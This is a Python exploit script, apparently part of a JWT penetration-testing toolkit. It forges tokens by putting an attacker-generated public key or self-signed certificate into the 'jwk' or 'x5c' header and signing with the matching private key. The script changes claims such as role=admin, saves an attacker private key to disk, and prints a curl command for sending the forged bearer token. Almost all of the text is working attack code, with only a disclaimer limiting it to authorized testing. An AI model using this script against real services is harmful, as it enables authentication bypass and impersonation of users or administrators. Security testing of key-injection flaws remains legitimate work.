#!/usr/bin/env python3
"""
jwk_inject.py — embed a self-generated key in the token header and sign with its private key
(guide §12 jwk, §13 x5c).

If the server verifies against the key carried IN the token (the `jwk` or `x5c` header) instead
of its own trusted key, you simply include YOUR public key and sign with YOUR private key — no
hosting needed. This is the easiest key-injection attack to try first.

Modes:
  default : generate an RSA keypair, embed the public key as `jwk`, sign RS256.
  --x5c   : embed a self-signed cert chain as `x5c` (provide --x5c cert.pem --key key.pem,
            or omit to auto-generate a throwaway self-signed cert).

AUTHORIZED TESTING ONLY. Forge into your own test account; never impersonate a real user.

Requires: pip install pyjwt cryptography
Example:
  python3 jwk_inject.py <TOKEN> --claim role=admin --claim sub=1337
  python3 jwk_inject.py <TOKEN> --x5c --claim role=admin
"""
import argparse
import base64
import sys
from jwt_common import decode_token, apply_claims

try:
    import jwt as pyjwt  # PyJWT
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization, hashes
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    import datetime
except ImportError:
    print("[!] pip install pyjwt cryptography", file=sys.stderr)
    sys.exit(1)


def gen_rsa():
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def jwk_from_public(pubkey, kid="poc-key"):
    nums = pubkey.public_numbers()

    def b64u_uint(n):
        b = n.to_bytes((n.bit_length() + 7) // 8, "big")
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    return {"kty": "RSA", "kid": kid, "use": "sig", "alg": "RS256",
            "n": b64u_uint(nums.n), "e": b64u_uint(nums.e)}


def self_signed_cert(priv):
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, u"poc")])
    cert = (x509.CertificateBuilder()
            .subject_name(subject).issuer_name(issuer)
            .public_key(priv.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=7))
            .sign(priv, hashes.SHA256()))
    return cert


def main():
    ap = argparse.ArgumentParser(description="Embed a self-key via jwk/x5c and sign.")
    ap.add_argument("token")
    ap.add_argument("--claim", action="append", default=[], help="key=value (repeatable)")
    ap.add_argument("--x5c", nargs="?", const="AUTO", help="embed x5c (optionally a cert PEM path)")
    ap.add_argument("--key", help="private key PEM path (for --x5c with your own cert)")
    args = ap.parse_args()

    header, payload, _ = decode_token(args.token)
    payload = apply_claims(payload, args.claim)
    header.pop("kid", None)
    header["alg"] = "RS256"

    # Load or generate the private key
    if args.key:
        with open(args.key, "rb") as f:
            priv = serialization.load_pem_private_key(f.read(), password=None)
    else:
        priv = gen_rsa()
        with open("attacker_private.pem", "wb") as f:
            f.write(priv.private_bytes(serialization.Encoding.PEM,
                                       serialization.PrivateFormat.PKCS8,
                                       serialization.NoEncryption()))
        print("[i] generated attacker_private.pem")

    if args.x5c is not None:
        if args.x5c != "AUTO":
            with open(args.x5c, "rb") as f:
                cert = x509.load_pem_x509_certificate(f.read())
        else:
            cert = self_signed_cert(priv)
        der = cert.public_bytes(serialization.Encoding.DER)
        header["x5c"] = [base64.b64encode(der).decode()]
        header.pop("jwk", None)
    else:
        header["jwk"] = jwk_from_public(priv.public_key())

    priv_pem = priv.private_bytes(serialization.Encoding.PEM,
                                  serialization.PrivateFormat.PKCS8,
                                  serialization.NoEncryption())
    forged = pyjwt.encode(payload, priv_pem, algorithm="RS256", headers=header)

    print("=== FORGED TOKEN ===")
    print(forged)
    print("\n[i] header now carries your", "x5c" if args.x5c is not None else "jwk", "and is signed with your private key.")
    print('[i] Send: curl -i "$URL" -H "Authorization: Bearer ' + forged + '"')


if __name__ == "__main__":
    main()
